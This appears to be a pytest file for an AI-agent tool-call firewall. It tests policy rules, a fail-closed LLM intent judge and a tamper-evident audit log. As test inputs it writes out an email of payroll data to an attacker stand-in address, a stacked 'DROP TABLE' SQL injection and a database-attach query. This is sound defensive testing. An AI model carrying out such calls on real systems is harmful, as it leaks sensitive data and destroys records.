from __future__ import annotations

from pathlib import Path

from audit.ledger import AuditLedger
from judge.gemini import JudgeResult, JudgeUnavailableError
from models.schemas import ToolCall, Verdict
from policy.engine import PolicyEngine
from scenarios import SCENARIOS, make_tool_call


def test_scenario_expected_decisions() -> None:
    engine = PolicyEngine()
    for scenario_id, scenario in SCENARIOS.items():
        result = engine.evaluate(make_tool_call(scenario_id))
        assert result.decision == scenario["expected_decision"], scenario_id


def test_unapproved_destination_with_sensitive_data_is_blocked() -> None:
    call = ToolCall(
        tool_name="send_email",
        arguments={
            "recipient": "outside@evil.example",
            "body": "payroll_data.csv",
        },
    )
    result = PolicyEngine().evaluate(call)
    assert result.decision == "BLOCK"
    assert {finding.rule_id for finding in result.findings} >= {
        "unapproved_destination",
        "sensitive_data",
        "exfiltration",
    }


def test_argument_schema_rejects_extra_fields() -> None:
    call = ToolCall(
        tool_name="send_email",
        arguments={
            "recipient": "team@internal.example.com",
            "body": "Hello",
            "bcc": "hidden@internal.example.com",
        },
    )
    result = PolicyEngine().evaluate(call)
    assert result.decision == "BLOCK"
    assert result.findings[0].rule_id == "schema_violation"


def test_bounded_update_is_blocked_but_where_update_is_allowed() -> None:
    engine = PolicyEngine()
    without_where = engine.evaluate(
        ToolCall(
            tool_name="query_db", arguments={"sql": "UPDATE customers SET tier='x'"}
        )
    )
    with_where = engine.evaluate(
        ToolCall(
            tool_name="query_db",
            arguments={"sql": "UPDATE customers SET tier='x' WHERE id='C-102'"},
        )
    )
    assert without_where.decision == "BLOCK"
    assert with_where.decision == "ALLOW"


def test_multiple_sql_statements_are_blocked() -> None:
    result = PolicyEngine().evaluate(
        ToolCall(
            tool_name="query_db",
            arguments={"sql": "SELECT id FROM customers; DROP TABLE customers"},
        )
    )
    assert result.decision == "BLOCK"
    assert "multiple_sql_statements" in {finding.rule_id for finding in result.findings}


def test_sql_cannot_access_filesystem_or_database_attachment() -> None:
    result = PolicyEngine().evaluate(
        ToolCall(
            tool_name="query_db",
            arguments={"sql": "ATTACH DATABASE '/tmp/outside.db' AS outside"},
        )
    )
    assert result.decision == "BLOCK"


def test_restricted_select_requires_review() -> None:
    result = PolicyEngine().evaluate(
        ToolCall(
            tool_name="query_db",
            arguments={
                "sql": "SELECT employee_id FROM payroll WHERE employee_id='E-001'"
            },
        )
    )
    assert result.decision == "REVIEW"
    assert "restricted_table" in {finding.rule_id for finding in result.findings}


def test_audit_chain_and_signature_detect_payload_tampering(tmp_path: Path) -> None:
    ledger = AuditLedger(tmp_path / "events.db", tmp_path / "signing-key.pem")
    call = make_tool_call("safe-internal-email")
    layer = PolicyEngine().evaluate(call)
    verdict = Verdict(
        decision=layer.decision,
        final_risk_score=layer.risk_score,
        layers=[layer],
        reason_summary="test verdict",
    )
    event = ledger.append(call, verdict, "test-policy-version")
    assert event.seq == 1
    assert ledger.verify()["valid"] is True

    with ledger._connect() as connection:
        connection.execute(
            "UPDATE audit_events SET payload = ? WHERE seq = 1",
            ('{"tampered":true}',),
        )
    verification = ledger.verify()
    assert verification == {"valid": False, "broken_at_seq": 1}


def test_api_simulator_execution_and_audit_flow(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("TRUSTTRACE_DB_PATH", str(tmp_path / "api-events.db"))
    monkeypatch.setenv("TRUSTTRACE_KEY_PATH", str(tmp_path / "api-key.pem"))
    from fastapi.testclient import TestClient

    import main

    with TestClient(main.app) as client:
        attack = client.post("/simulate/invoice-exfiltration")
        assert attack.status_code == 200
        assert attack.json()["verdict"]["decision"] == "BLOCK"

        safe = client.post(
            "/v1/execute",
            json={
                "tool_name": "send_email",
                "arguments": {
                    "recipient": "team@internal.example.com",
                    "subject": "Notes",
                    "body": "See you Thursday.",
                },
            },
        )
        assert safe.status_code == 200
        assert safe.json()["verdict"]["decision"] == "ALLOW"
        assert safe.json()["result"]["mocked"] is True

        scorecard = client.post("/v1/simulate/run-all")
        assert scorecard.status_code == 200
        assert scorecard.json()["scenario_accuracy"] == 1
        assert client.get("/v1/audit/verify").json()["valid"] is True
        report = client.get("/v1/audit/report").json()
        assert report["event_count"] == 10
        assert "does not establish certification" in report["disclaimer"]

        class LowRiskJudge:
            model = "gemini-test"
            configured = True

            def evaluate(self, call):
                return (
                    JudgeResult(
                        aligned_with_user_intent=True,
                        injection_suspected=False,
                        injection_source_id=None,
                        risk_score=0.1,
                        rationale="The call is consistent with the user instruction.",
                    ),
                    5.0,
                )

        monkeypatch.setattr(main, "judge", LowRiskJudge())
        restricted_read = client.post(
            "/v1/intercept",
            json={
                "tool_name": "query_db",
                "arguments": {
                    "sql": "SELECT employee_id FROM payroll WHERE employee_id='E-001'"
                },
            },
        )
        assert restricted_read.json()["verdict"]["decision"] == "REVIEW"
        assert restricted_read.json()["verdict"]["layers"][1]["layer"] == (
            "L3 Gemini intent judge"
        )

        class UnavailableJudge:
            model = "gemini-test"
            configured = True

            def evaluate(self, call):
                raise JudgeUnavailableError("simulated outage")

        monkeypatch.setattr(main, "judge", UnavailableJudge())
        safe_but_unchecked = client.post(
            "/v1/intercept",
            json={
                "tool_name": "read_file",
                "arguments": {"path": "demo/notes.txt"},
            },
        )
        assert safe_but_unchecked.json()["verdict"]["decision"] == "BLOCK"
        assert (
            safe_but_unchecked.json()["verdict"]["layers"][1]["findings"][0]["rule_id"]
            == "evaluator_unavailable"
        )
